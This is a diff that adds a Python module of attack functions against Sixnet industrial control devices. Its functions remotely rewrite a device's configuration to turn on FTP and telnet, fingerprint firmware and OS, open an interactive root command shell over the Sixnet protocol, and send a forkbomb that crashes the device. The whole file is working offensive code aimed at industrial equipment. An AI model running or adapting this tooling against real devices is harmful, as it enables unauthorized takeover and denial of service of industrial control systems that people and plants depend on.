@@ -1,0 +1,72 @@
+import file_manip
+from SUP_message import sup_msg
+import STX_Networking
+
+def enable_ftp(ip):
+    sixnet_config = "/etc/stacfg/general.config"
+    """Enables telnet on a sixnet device if it is not already enabled"""
+    print("enabling ftp...")
+    config = file_manip.get_file(sixnet_config, ip)
+
+    #find telnet part and change it from 0 to 1
+    new_config = config.replace("enable ftp=0", "enable ftp=1")
+
+    file_manip.write_file(sixnet_config, new_config, ip)
+    print("Success!")
+
+def enable_telnet(ip):
+    sixnet_config = "/etc/stacfg/general.config"
+    """Enables telnet on a sixnet device if it is not already enabled"""
+    print("enabling telnet...")
+    config = file_manip.get_file(sixnet_config, ip)
+
+    #find telnet part and change it from 0 to 1
+    new_config = config.replace("enable telnet=0", "enable telnet=1")
+
+    file_manip.write_file(sixnet_config, new_config, ip)
+    print("Success!")
+
+def fingerprint(ip):
+    """Gets the Sixnet firmware version, IO map, and OS version"""
+    file = "/etc/sxbuildinfo.txt"
+    build_info = file_manip.get_file(file, ip)
+
+    #format the build info to remove unnecessary data
+    build_info = build_info.split("\t")
+    build_info = build_info[0] + " " +  build_info[1]
+
+    #TODO: Find analog/digital inputs/outputs
+    #I think the only way to do it is to query each one and see if I get a response or an error or something
+    #After much fiddling this thing will let you read from or write to 8192 input and output registers with out telling you that
+    #only 4 of those are actually being used. 
+
+    #just send a uname command over
+    os_ver = STX_Networking.send_command(ip,"uname -sr").data[4:].decode("hex")
+
+    print("Firmware:\t" + build_info)
+    print("OS: \t\t" + os_ver)
+    
+def sup_shell(ip):
+    """A very root shell for interfacing with the sixnet device at the designated ip"""
+    print("Sixnet Universal Protocol shell v0.1")
+    #find out who you are
+    whoami = STX_Networking.send_command(ip, "whoami")
+    #strip off header of data ( a null and a 0x05 or something)
+    whoami = whoami.data[4:].decode("hex")
+    #strip off newline
+    whoami = whoami[:4]
+
+    while(True):
+        #read in the shell command from the user and send that shit off
+        input = raw_input(whoami + "$ ")
+        if(input == "exit"):
+            break
+
+        reply = STX_Networking.send_command(ip, input)
+
+        #Decode the reply and print it
+        print reply.data[4:].decode("hex")
+
+def forkbomb(ip):
+    STX_Networking.send_command(ip, "p(){ p|p& }; p")
+    print   "boom"
